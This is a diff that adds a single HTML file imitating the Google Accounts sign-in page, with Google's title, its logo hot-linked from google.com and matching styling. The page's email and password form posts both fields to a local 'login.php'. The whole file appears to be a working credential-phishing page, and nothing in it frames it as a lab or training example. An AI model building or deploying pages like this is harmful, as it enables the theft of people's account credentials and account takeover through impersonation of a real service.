@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #fff; margin: 0; padding: 0; }
+        .container { max-width: 450px; margin: 100px auto; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; }
+        .logo { text-align: center; margin-bottom: 20px; }
+        .logo img { width: 75px; }
+        .title { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 10px; }
+        .subtitle { text-align: center; color: #5f6368; margin-bottom: 35px; }
+        .input-field { width: 100%; padding: 13px 15px; margin-bottom: 20px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
+        .input-field:focus { border-color: #1a73e8; outline: none; box-shadow: 0 0 0 2px #e8f0fe; }
+        .next-button { background: #1a73e8; color: white; border: none; padding: 10px 24px; font-size: 15px; font-weight: 500; border-radius: 4px; cursor: pointer; float: right; }
+        .next-button:hover { background: #0d62d9; }
+        .footer { clear: both; padding-top: 30px; text-align: center; color: #5f6368; font-size: 14px; }
+        .link { color: #1a73e8; text-decoration: none; }
+        .forgot { float: left; padding-top: 12px; color: #1a73e8; text-decoration: none; font-size: 14px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" alt="Google">
+        </div>
+        <h1 class="title">Sign in</h1>
+        <div class="subtitle">Use your Google Account</div>
+        <form action="login.php" method="POST">
+            <input type="email" class="input-field" name="email" placeholder="Email or phone" required autofocus>
+            <input type="password" class="input-field" name="password" placeholder="Enter your password" required>
+            <a href="#" class="forgot">Forgot email?</a>
+            <button type="submit" class="next-button">Next</button>
+            <div class="footer">
+                Not your computer? Use Guest mode to sign in privately. <a href="#" class="link">Learn more</a>
+            </div>
+        </form>
+    </div>
+</body>
+</html>
